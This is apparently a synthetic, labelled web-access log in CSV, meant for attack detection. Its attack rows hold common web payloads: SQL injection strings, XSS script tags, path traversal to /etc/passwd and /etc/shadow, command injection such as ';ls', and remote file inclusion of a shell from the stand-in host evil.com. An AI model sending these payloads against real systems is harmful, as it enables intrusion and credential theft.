timestamp,ip,method,url,status_code,user_agent,is_attack,attack_type
2025-04-30 07:57:22,192.168.0.105,POST,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.241,POST,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.110,GET,/product?id=10 OR 1=1,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.213,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.193,POST,/search?q=<script>alert('x')</script>,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.27,POST,/dashboard,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.87,GET,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.16,POST,/css/style.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.150,POST,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.105,POST,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.185,POST,/search?q=<script>alert('x')</script>,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.171,GET,/vendor/bootstrap.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.46,GET,/search?q=<script>alert('x')</script>,200,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.254,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.247,POST,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.42,GET,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.4,GET,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.72,GET,/,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.90,GET,/login?user=admin'--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.223,POST,/js/app.js,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.66,POST,/dashboard,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.40,GET,/about,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.193,POST,/about,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.254,POST,/favicon.ico,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.76,POST,/profile,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.110,POST,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.111,GET,/,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.167,POST,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.213,GET,/dashboard,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.194,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.193,POST,/page?file=http://evil.com/shell.txt,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.154,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.40,GET,/ping?ip=127.0.0.1;ls,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.112,POST,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.100,POST,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.72,GET,/about,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.156,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.31,GET,/vendor/bootstrap.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.64,GET,/dashboard,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.207,POST,/favicon.ico,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.30,GET,/product?id=10 OR 1=1,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.218,GET,/page?file=http://evil.com/shell.txt,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.240,POST,/index.html,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.3,GET,/vendor/bootstrap.css,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.71,POST,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.32,GET,/profile,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.234,POST,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.54,POST,/img/logo.png,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.129,POST,/view?include=../../../../etc/passwd,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.71,POST,/favicon.ico,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.93,GET,/dashboard,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.7,GET,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.112,GET,/about,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.31,POST,/search?q=<script>alert('x')</script>,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.95,GET,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.9,GET,/index.html,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.84,POST,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.173,POST,/profile,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.109,GET,/about,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.202,GET,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.185,GET,/search?q=1' UNION SELECT null--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.244,POST,/css/style.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.104,POST,/about,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.56,GET,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.186,POST,/,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.65,GET,/img/logo.png,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.55,GET,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.19,POST,/view?include=../../../../etc/passwd,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.48,GET,/,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.15,GET,/product?id=10 OR 1=1,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.250,GET,/view?include=../../../../etc/passwd,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.152,GET,/cmd?exec=cat%20/etc/passwd,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.123,GET,/search?q=1' UNION SELECT null--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.230,POST,/profile,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.117,GET,/page?file=http://evil.com/shell.txt,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.62,GET,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.232,POST,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.12,POST,/view?include=../../../../etc/passwd,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.50,POST,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.117,GET,/search?q=<script>alert('x')</script>,200,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.147,GET,/index.html,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.140,POST,/login?user=admin'--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.220,POST,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.104,POST,/profile,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.48,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.55,GET,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.176,GET,/profile,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.154,GET,/vendor/bootstrap.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.33,GET,/cmd?exec=cat%20/etc/passwd,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.59,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.2,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.80,GET,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.27,POST,/contact,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.199,POST,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.66,GET,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.217,POST,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.192,GET,/ping?ip=127.0.0.1;ls,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.106,GET,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.102,GET,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.246,POST,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.160,GET,/dashboard,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.148,GET,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.143,POST,/profile,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.53,POST,/page?file=http://evil.com/shell.txt,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.198,POST,/css/style.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.177,GET,/contact,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.56,POST,/product?id=10 OR 1=1,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.44,GET,/contact,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.201,GET,/js/app.js,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.222,GET,/js/app.js,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.106,GET,/ping?ip=127.0.0.1;ls,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.40,GET,/view?include=../../../../etc/passwd,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.162,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.56,POST,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.8,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.58,GET,/download?file=../../../../etc/passwd,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.98,POST,/download?file=../../../../etc/passwd,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.171,GET,/profile,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.222,POST,/login?user=admin'--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.217,POST,/,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.21,GET,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.174,GET,/dashboard,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.218,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.46,GET,/download?file=../../../../etc/passwd,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.255,POST,/index.html,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.23,GET,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.183,POST,/contact,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.184,GET,/index.html,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.6,GET,/vendor/bootstrap.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.135,GET,/ping?ip=127.0.0.1;ls,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.183,GET,/view?include=../../../../etc/passwd,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.156,GET,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.103,GET,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.238,POST,/,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.231,GET,/profile,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.81,GET,/login?user=admin'--,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.253,GET,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.128,POST,/dashboard,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.208,GET,/page?file=http://evil.com/shell.txt,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.225,GET,/about,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.212,POST,/index.html,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.9,GET,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.239,POST,/about,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.220,GET,/search?q=1' UNION SELECT null--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.77,GET,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.11,POST,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.99,POST,/index.html,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.251,POST,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.110,GET,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.45,GET,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.126,POST,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.93,POST,/,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.211,POST,/profile,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.44,POST,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.118,GET,/view?include=../../../../etc/passwd,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.159,POST,/page?file=http://evil.com/shell.txt,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.41,POST,/page?file=http://evil.com/shell.txt,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.92,POST,/download?file=../../../../etc/passwd,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.31,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.229,GET,/js/app.js,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.191,POST,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.5,GET,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.36,POST,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.132,GET,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.207,GET,/,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.34,POST,/dashboard,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.71,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.232,GET,/index.html,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.178,POST,/cmd?exec=cat%20/etc/passwd,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.75,GET,/about,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.201,GET,/favicon.ico,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.114,GET,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.182,POST,/favicon.ico,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.49,POST,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.225,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.190,GET,/page?file=http://evil.com/shell.txt,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.51,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.103,POST,/view?include=../../../../etc/passwd,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.220,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.157,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.242,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.69,GET,/login?user=admin'--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.135,POST,/contact,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.218,POST,/login?user=admin'--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.199,POST,/css/style.css,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.176,GET,/css/style.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.145,GET,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.238,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.117,POST,/login?user=admin'--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.7,POST,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.248,POST,/index.html,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.184,POST,/js/app.js,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.121,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.136,POST,/ping?ip=127.0.0.1;ls,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.207,POST,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.58,GET,/vendor/bootstrap.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.32,GET,/css/style.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.14,POST,/favicon.ico,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.233,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.7,GET,/search?q=1' UNION SELECT null--,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.180,POST,/contact,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.179,GET,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.64,POST,/index.html,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.238,GET,/css/style.css,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.147,GET,/cmd?exec=cat%20/etc/passwd,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.191,POST,/favicon.ico,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.29,POST,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.4,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.119,POST,/index.html,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.210,GET,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.87,POST,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.44,GET,/js/app.js,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.199,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.107,POST,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.68,POST,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.188,POST,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.69,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.209,POST,/cmd?exec=cat%20/etc/passwd,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.133,GET,/product?id=10 OR 1=1,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.26,POST,/search?q=<script>alert('x')</script>,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.100,GET,/profile,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.39,POST,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.119,POST,/js/app.js,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.251,GET,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.26,GET,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.236,POST,/product?id=10 OR 1=1,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.110,GET,/js/app.js,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.58,POST,/page?file=http://evil.com/shell.txt,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.57,POST,/index.html,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.107,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.11,GET,/cmd?exec=cat%20/etc/passwd,403,python-requests/2.25,True,command_injection
